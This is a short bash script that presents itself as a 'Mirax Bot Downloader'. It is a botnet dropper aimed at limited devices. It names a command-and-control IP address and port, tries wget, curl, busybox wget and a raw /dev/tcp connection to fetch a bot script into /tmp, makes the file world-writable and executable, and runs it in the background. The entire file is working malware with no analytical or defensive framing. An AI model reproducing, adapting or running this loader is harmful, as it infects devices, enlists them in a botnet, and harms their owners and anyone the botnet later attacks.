#!/bin/bash
# Mirax Bot Downloader - Lightweight version for limited devices
# Downloads and runs the bot with minimal commands

C2_HOST="85.11.167.41"
HTTP_PORT="8080"

# Try multiple methods to download
download() {
    # Try wget
    if command -v wget >/dev/null 2>&1; then
        wget -q "http://$C2_HOST:$HTTP_PORT/bot.sh" -O /tmp/bot 2>/dev/null && return 0
    fi
    
    # Try curl
    if command -v curl >/dev/null 2>&1; then
        curl -s "http://$C2_HOST:$HTTP_PORT/bot.sh" -o /tmp/bot 2>/dev/null && return 0
    fi
    
    # Try busybox wget
    if command -v busybox >/dev/null 2>&1; then
        busybox wget -q "http://$C2_HOST:$HTTP_PORT/bot.sh" -O /tmp/bot 2>/dev/null && return 0
    fi
    
    # Try /dev/tcp
    if [ -e /dev/tcp ]; then
        exec 5<>/dev/tcp/$C2_HOST/$HTTP_PORT
        echo -e "GET /bot.sh HTTP/1.0\n\n" >&5
        cat <&5 > /tmp/bot
        exec 5>&-
        return 0
    fi
    
    return 1
}

echo "[+] Downloading bot..."
if download; then
    chmod 777 /tmp/bot
    echo "[+] Running bot..."
    /bin/sh /tmp/bot &
    echo "[+] Bot started"
else
    echo "[-] Failed to download bot"
    exit 1
fi